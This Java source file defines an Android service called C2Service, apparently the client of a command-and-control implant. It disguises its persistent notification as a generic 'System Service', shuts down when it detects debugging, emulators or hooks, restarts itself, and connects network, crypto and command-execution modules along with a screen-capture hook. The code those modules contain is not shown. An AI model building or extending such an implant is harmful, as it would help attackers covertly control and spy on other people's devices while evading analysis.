package com.example.client;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import androidx.core.app.NotificationCompat;

/**
 * Main C2 service - now simplified and modular
 * Coordinates between different manager components
 */
public class C2Service extends Service {

    private static final String TAG = "C2Service";
    private static final String NOTIFICATION_CHANNEL_ID = "C2Kanal";
    private static final int NOTIFICATION_ID = 1;

    // Core components
    private final AtomicBoolean isRunning = new AtomicBoolean(false);
    private final AtomicBoolean isConnected = new AtomicBoolean(false);
    private ScheduledExecutorService scheduler;

    // Modular components
    private ConfigManager configManager;
    private SecurityManager securityManager;
    private NetworkManager networkManager;
    private CommandExecutor commandExecutor;
    private SecureConfig secureConfig;
    private CryptoManager cryptoManager;
    private AuthManager authManager;
    private IntegrityValidator integrityValidator;

    /**
     * Log an event to be sent to C2 server
     */
    public static void logEvent(JSONObject event) {
        // This will be handled by the network manager
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service being created");

        // Initialize modular components
        initializeComponents();

        // Perform security checks
        if (!performSecurityChecks()) {
            Log.e(TAG, "Security checks failed - stopping service");
            stopSelf();
            return;
        }

        // Start foreground service
        startForegroundService();

        Log.d(TAG, "Service created successfully");
    }

    private void initializeComponents() {
        try {
            // Initialize configuration
            configManager = new ConfigManager(this);

            // Initialize security components
            secureConfig = SecureConfig.getInstance(this);
            cryptoManager = new CryptoManager();
            authManager = new AuthManager(this);
            integrityValidator = new IntegrityValidator(this);
            securityManager = new SecurityManager(this);

            // Initialize network manager
            networkManager = new NetworkManager(this);
            networkManager.initialize(secureConfig, cryptoManager, authManager);

            // Initialize command executor
            commandExecutor = new CommandExecutor(this);

            // Initialize scheduler
            scheduler = Executors.newScheduledThreadPool(3);

            Log.d(TAG, "All components initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize components", e);
            throw new RuntimeException("Component initialization failed", e);
        }
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    "System Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Core service running.")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();

        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");

        // Handle screen capture intent if provided
        if (intent != null && "START_SCREEN_CAPTURE".equals(intent.getAction())) {
            // This will be handled by a separate screen capture manager in the future
            Log.d(TAG, "Screen capture intent received");
        }

        // Start network manager if not already running
        if (!isRunning.get()) {
            isRunning.set(true);
            networkManager.start();
        }

        return START_STICKY;
    }

    private boolean performSecurityChecks() {
        try {
            SecurityManager.SecurityCheckResult result = securityManager.performSecurityCheck();

            if (!result.overallSecure) {
                Log.e(TAG, "Security check failed: " + result.toString());

                // Critical security issues = stop service
                if (result.debuggingDetected || result.emulatorDetected || result.hooksDetected) {
                    return false;
                }

                // Warnings for less critical issues
                if (result.rootDetected) {
                    Log.w(TAG, "Root access detected - service running with elevated risk");
                }
            }

            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error during security checks", e);
            return false;
        }
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service being destroyed");
        isRunning.set(false);
        isConnected.set(false);

        // Stop network manager
        if (networkManager != null) {
            networkManager.stop();
        }

        // Shutdown scheduler
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
            try {
                if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    scheduler.shutdownNow();
                }
            } catch (InterruptedException e) {
                scheduler.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }

        // Cleanup security components
        if (authManager != null) {
            authManager.clearAuthentication();
        }

        if (cryptoManager != null) {
            cryptoManager.clearKey();
        }

        Log.d(TAG, "Service destroyed successfully");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
